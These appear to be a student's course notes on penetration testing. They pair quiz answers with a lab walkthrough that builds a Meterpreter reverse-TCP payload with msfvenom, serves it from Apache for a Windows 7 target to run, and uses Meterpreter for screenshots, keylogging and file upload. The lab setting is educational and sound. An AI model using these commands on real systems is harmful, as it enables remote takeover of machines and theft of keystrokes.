# Lab and Quiz Review
## Quiz
1. A reverse shell is a type of shell in which the target machine communicates back to the attacking machine
  * more practical and widely used
3. Posting on a website is _**not**_ the only way to deliver the payload/malicious code
4. Only the `sessions` command can view and interact with a background session
5. Penetrations testing can evelauate the security of the system or network

* False Statements: cannot be used to identify the vulnerabilities let undetected by automated vulnerability scanners; is an unauthroized attempt to exploit a computer system
7. `screenshot` is the command used to create a printscreen from the target machine in the Meterpreter shell
8. `use exploit` command is used to select an exploit
9. In the `Windows Shell` environment attacker can use “net user” to create an account
10. The `set` command is used to select a payload

## Lab
### Task A
#### Kali Terminal 1
`
msfconsole // opens the shell
use exploit/multi handler
show options
set payload windows/meterpreter/reverse_tcp
set lhost 192.169.10.13  // ip address of the attacker
set lport 30122
show options // shows us that we have the correct information added
exploit
`
#### Kali Terminal 2
`
msfvenom -p windows.meterpreter/reverse_tcp lhost=192.168.10.13 lport=30122 -f exe -o kboeh002.exe  // kboeh002.exe is the payload we just created
`

Next step is to deliver it to the fake website

`
service apache2 start
cp kboeh002.exe /var/www/html/
ls /var/www/html  // lists content so we can double check it has been properly uploaded
`
### Windows 7

Access the ip address of the attacker machine and /filename

`192.168.10.13/kboeh002.exe` which will download the payload, then you must run it

### Task B

#### Kali Terminal 1

`screenshot'

* if you use the `screenshare` command it will stream the desktop, similar to sharing a screen in discord or zoom

`keyscan` command to pick up keystrokes from target
`keyscan_start`

#### Windows 7

Type "This is Kristiana Boehmer, happy spring break!"

#### Kali Terminal 1
`keyscan_dump` // returns keystrokes
`keyscan_stop` // ends the keystroke record
#### Kali Terminal 3
`
// Create document with date
echo -e "$(date)" > ~/IMadeIt-kboeh002.txt
`
### Kali Terminal 1

* must specify souce and destination paths

`
upload IMadeIt-kboeh002.txt
`
It will upload by default to the current location in the system, if you want it to go to a different location...

`upload IMadeIt-kboeh002.txt 'C:\Users\Windows 7\Desktop'` // this will upload it to the desktop of the target

### Task C
####

# Password Security
### 3/21/22
* dd 
* d
